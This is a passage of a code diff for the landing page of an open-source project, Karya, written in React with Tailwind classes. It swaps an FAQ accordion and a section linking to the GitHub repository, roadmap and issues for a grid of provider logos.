-            <div className="min-w-0 flex-[2_1_480px] border-t border-line-2">
-              {FAQ.map(([q, a]) => (
-                <details key={q} className="group border-b border-line-2">
-                  <summary className="flex cursor-pointer list-none justify-between gap-4 px-0 py-5 font-serif text-[21px] leading-[1.3] hover:text-accent [&::-webkit-details-marker]:hidden">
-                    {q}
-                    <span className="flex-none font-mono text-accent [transition:transform_.2s] group-open:[transform:rotate(45deg)]">+</span>
-                  </summary>
-                  <p className="mt-0 mb-[22px] max-w-[62ch] font-serif text-[17.5px] leading-[1.6] text-fg-2">{a}</p>
-                </details>
+            <div data-reveal className="grid grid-cols-4 gap-px self-center border border-line bg-line">
+              {PROVIDERS.map(([id, name]) => (
+                <div key={id} title={name} className="group flex aspect-square items-center justify-center bg-bg [transition:background_.2s] hover:bg-bg-2">
+                  <span role="img" aria-label={name} className="block h-[clamp(28px,3.4vw,44px)] w-[clamp(28px,3.4vw,44px)] bg-fg-2 [mask-position:center] [mask-repeat:no-repeat] [mask-size:contain] [transition:background_.2s] group-hover:bg-fg" style={{ maskImage: `url(/providers/${id}.svg)`, WebkitMaskImage: `url(/providers/${id}.svg)` }} />
+                </div>
               ))}
-            </div>
-          </div>
-        </section>
-
-        {/* open source */}
-        <section id="source" className="border-t border-line">
-          <div className={sectionPad}>
-            <div data-reveal className={label}>open source</div>
-            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>Small enough to read.</h2>
-            <p data-reveal className={`${lead} mt-0 mb-4 max-w-[62ch]`}>One loop, one provider interface, one binary, and every dependency has to earn its place. Karya is pre-1.0 and in active development; the roadmap shows what works today and what is next. Interfaces may change between releases.</p>
-            <p data-reveal className={`${lead} mt-0 mb-9 max-w-[62ch]`}>
-              Issues and pull requests are welcome. For anything larger than a bug fix, open an issue first so the change can be discussed before the work is done.
-            </p>
-            <div className="flex flex-wrap gap-x-7 gap-y-3 font-mono text-[13.5px]">
-              <a href="https://github.com/prateek041/karya" className={`${textLink} text-fg`}>
-                github.com/prateek041/karya ↗
-              </a>
-              <Link href="/roadmap" className={`${textLink} text-fg-2`}>
-                Roadmap
-              </Link>
-              <a href="https://github.com/prateek041/karya/issues" className={`${textLink} text-fg-2`}>
-                Issues
-              </a>
             </div>
           </div>
         </section>
